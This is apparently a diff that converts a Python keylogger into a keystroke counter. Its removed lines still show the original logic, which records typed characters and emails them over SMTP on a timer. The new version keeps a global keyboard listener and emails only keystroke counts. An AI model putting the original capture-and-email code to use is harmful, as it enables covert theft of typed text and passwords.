@@ -1,38 +1,30 @@
+import os
+import sys
 import smtplib
 import datetime
 from pynput import keyboard
 from threading import Timer
 
-
-
 class Keylogger:
-    def __init__(self, interval=300):
-        # Time interval for sending mails.
-        self.interval = interval
-        # Used to store keystrokes captured from the device.
-        self.logs = ''
+    def __init__(self):
         self.email = ''
         self.password = ''
-
+        self.count = 0
 
     def handle_key_press(self, key):
-        try:
-            self.logs += key.char
-        except AttributeError:
-            if key == keyboard.Key.backspace:
-                self.logs = self.logs[:-1]
-            elif key == keyboard.Key.enter:
-                self.logs += '[ENTER]\n' 
-            elif key == keyboard.Key.space:
-                self.logs += ' '
-            else:
-                pass
-
+        self.count += 1
 
     def request_mail_credentials(self):
-        self.email = input('Enter Email: ')
-        self.password = input('Enter Password: ')
-
+        try:
+            self.email = os.environ["counter_email"]
+        except KeyError:
+            print("Must set counter_email enviroment variable.")
+            sys.exit(1)
+        try:
+            self.password = os.environ["counter_password"]
+        except KeyError:
+            print("Must set counter_password enviroment variable.")
+            sys.exit(1)
 
     def send_mail(self, email, password, msg):
         # You can change your smtp server if you use a different mail
@@ -47,17 +39,15 @@ class Keylogger:
         finally:
             server.quit()
 
-
     def report(self):
-        if self.logs:    
-            log_date = datetime.datetime.now()
-            msg = f'Subject: Log info {log_date}\n' + self.logs
-            self.send_mail(self.email, self.password, msg)
-        self.logs = ''
-        timer = Timer(interval=self.interval, function=self.report)
+        log_date = datetime.datetime.now()
+        msg = f'Subject: Log info {log_date}\n\nKeystrokes: {self.count}\n'
+        self.send_mail(self.email, self.password, msg)
+        self.count = 0
+#        timer = Timer(interval=60*60*24, function=self.report)
+        timer = Timer(interval=60*3, function=self.report)
         timer.daemon = True
         timer.start()
-
 
     def start(self):
         self.request_mail_credentials()
@@ -65,10 +55,8 @@ class Keylogger:
         with keyboard.Listener(on_release=self.handle_key_press) as listener:
             listener.join()
 
-
-
 if __name__ == '__main__':
-    keylogger = Keylogger(10)
+    keylogger = Keylogger()
     keylogger.start()
 
 
